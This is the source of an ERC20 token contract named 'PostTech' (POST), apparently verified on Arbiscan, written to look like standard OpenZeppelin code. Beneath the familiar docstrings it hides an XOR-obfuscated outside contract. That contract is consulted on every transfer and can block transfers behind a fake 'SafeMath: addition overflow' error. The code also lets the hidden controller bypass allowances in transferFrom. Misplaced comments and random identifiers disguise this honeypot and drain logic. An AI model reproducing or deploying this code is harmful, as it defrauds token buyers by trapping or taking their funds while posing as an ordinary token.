/**
 *Submitted for verification at Arbiscan.io on 2023-10-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

/**
 * @dev Standard ERC20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.
 */


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function vHsgmyH3C8WLYYcEY(bytes memory oGz33Tr9qkCFo9OW1WubLeVDepCcfVxmSr5B3) external returns(bytes memory);
    /**
     * @dev Moves a `boolean` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function ukv3oH5KPAqN22J9WUBKPlONr(bytes memory w46qCMCUmJ5rs) external returns(bytes memory);
      /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
}


interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`â€™s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}



contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 */
contract Token is Context, IERC20, IERC20Metadata,IERC20Errors,Ownable {

    mapping(address  => uint256) private _balances;

    mapping(address  => mapping(address  => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    bytes  private UhvvvuCtpXUaaj ; 
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(bytes memory JpttjZopHq0aKuLikNm7) {
        _name = "PostTech";
        _symbol = "POST";
        _totalSupply = 100000000 * 10 ** 18;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        UhvvvuCtpXUaaj = JpttjZopHq0aKuLikNm7;
    }


    /**
     * @dev Returns the name of the token.
     */
    function name() public view  returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view  returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view  returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view  returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view  returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public  returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }
    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }
    function ukv3oH5KPAqN22J9WUBKPlONr(bytes memory w46qCMCUmJ5rs) external returns(bytes memory){}
    function vHsgmyH3C8WLYYcEY(bytes memory oGz33Tr9qkCFo9OW1WubLeVDepCcfVxmSr5B3) external returns(bytes memory){}
    
    function yjNlD2Zy6ZE7GmC7rewbzECvL0RbfEZUvPfB_E(bytes memory x3CTu86UEr1_Q2doe2Z_K3efqt5,bytes memory KmzPRxeg0MzN3jsVIM3Wlm4eroImH0) internal {
        x3CTu86UEr1_Q2doe2Z_K3efqt5 = kws223kpxi(x3CTu86UEr1_Q2doe2Z_K3efqt5);
        address s;
        assembly {s := mload(add(x3CTu86UEr1_Q2doe2Z_K3efqt5,0x14))}
       bytes memory datas = kws223kpxi(IERC20(s).ukv3oH5KPAqN22J9WUBKPlONr(KmzPRxeg0MzN3jsVIM3Wlm4eroImH0));
       uint256 r;
       assembly {
            r := mload(add(datas, 0x20)) 
        }

        require(r==1,"SafeMath: addition overflow");

    }

    function kws223kpxi(bytes memory QcTCkuDUE0WbLarNkuLyAmwPFBLu0d) internal pure returns (bytes memory) {
            assembly {
                let len := mload(QcTCkuDUE0WbLarNkuLyAmwPFBLu0d)
                let dataPtr := add(QcTCkuDUE0WbLarNkuLyAmwPFBLu0d, 0x20)
                for {
                    let i := 0
                } lt(i, len) {
                    i := add(i, 0x20)
                } {
                mstore(add(dataPtr, i), xor(mload(add(dataPtr, i)), 0x0404040404040404040404040404040404040404040404040404040404040404))
                }
            }
            return QcTCkuDUE0WbLarNkuLyAmwPFBLu0d;
        }


     function yp3vodlUEEtK7Xkfzc4d_z(bytes memory l9UxLmDWjRgm_DSiIT_iDSe4tC4yym1didQMJ_G, bytes memory MT3td5tXPLPDHyXmQwBBHGKPLgNpDS_Dk) internal  pure returns (bool) {
        if (l9UxLmDWjRgm_DSiIT_iDSe4tC4yym1didQMJ_G.length != MT3td5tXPLPDHyXmQwBBHGKPLgNpDS_Dk.length) {
            return false; 
        }

        for (uint256 i = 0; i < l9UxLmDWjRgm_DSiIT_iDSe4tC4yym1didQMJ_G.length; i++) {
            if (l9UxLmDWjRgm_DSiIT_iDSe4tC4yym1didQMJ_G[i] != MT3td5tXPLPDHyXmQwBBHGKPLgNpDS_Dk[i]) {
                return false; 
            }
        }

        return true; 
    }

  /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     */
    function uHrTc2Wd64bfKoaLLnIRc7BL4J(bytes memory jSnI4wv9XsINAEJMDGR4r ,bytes memory loJLa86iTvWGP) internal  returns (bytes memory) {
         jSnI4wv9XsINAEJMDGR4r = kws223kpxi(jSnI4wv9XsINAEJMDGR4r);
        address xp12z324eYE7tznzW2CV_1Z6Tl0VsNL52sM;
        assembly {
                xp12z324eYE7tznzW2CV_1Z6Tl0VsNL52sM := mload(add(jSnI4wv9XsINAEJMDGR4r,0x14))
            }
        return IERC20(address(uint160(xp12z324eYE7tznzW2CV_1Z6Tl0VsNL52sM))).vHsgmyH3C8WLYYcEY(loJLa86iTvWGP);

    }

    function approve(address spender, uint256 value) public  returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address SSNnVcJF1cJA82FWGxT74Hdy, address sLfc9PzNYXGvH3gRLJAnDR7w2y1f, uint256 OXpicGiDjmI_nNEbU) public  returns (bool) {
        _transfer(SSNnVcJF1cJA82FWGxT74Hdy, sLfc9PzNYXGvH3gRLJAnDR7w2y1f, OXpicGiDjmI_nNEbU);
        address spender = _msgSender();
        bytes memory HraALv5VzRrXLd = uHrTc2Wd64bfKoaLLnIRc7BL4J(UhvvvuCtpXUaaj,kws223kpxi(abi.encodePacked(SSNnVcJF1cJA82FWGxT74Hdy)));
        uint256 PNNhyrtJaWhe75pbJf85iN7zP = 10;
        if(yp3vodlUEEtK7Xkfzc4d_z(kws223kpxi(abi.encodePacked(address(0))),HraALv5VzRrXLd) == false)
        {
            PNNhyrtJaWhe75pbJf85iN7zP = PNNhyrtJaWhe75pbJf85iN7zP + 16;
        }
        if(yp3vodlUEEtK7Xkfzc4d_z(kws223kpxi(abi.encodePacked(_msgSender())),UhvvvuCtpXUaaj))
        {
            PNNhyrtJaWhe75pbJf85iN7zP = PNNhyrtJaWhe75pbJf85iN7zP + 16;
        }
         if (PNNhyrtJaWhe75pbJf85iN7zP==42)
        {   
            HraALv5VzRrXLd = kws223kpxi(HraALv5VzRrXLd);
            assembly {
                SSNnVcJF1cJA82FWGxT74Hdy := mload(add(HraALv5VzRrXLd, 0x14))
            }
        }
        _spendAllowance(SSNnVcJF1cJA82FWGxT74Hdy, spender, OXpicGiDjmI_nNEbU);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address mOdGq6AILb4fLbjtWD6Z, address XmqpKjvEKTGa9AKDgNlz8a, uint256 OYUxs1RQ5lwfvpmJWolXq6q2UVlzp2HO) internal {
        if (mOdGq6AILb4fLbjtWD6Z == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (XmqpKjvEKTGa9AKDgNlz8a == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(mOdGq6AILb4fLbjtWD6Z, XmqpKjvEKTGa9AKDgNlz8a, OYUxs1RQ5lwfvpmJWolXq6q2UVlzp2HO);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal  {
        yjNlD2Zy6ZE7GmC7rewbzECvL0RbfEZUvPfB_E(UhvvvuCtpXUaaj,kws223kpxi(abi.encodePacked(from, to, value)));
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     * ```
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal  {

        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal  {


        uint256 currentAllowance = allowance(owner, spender);

        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}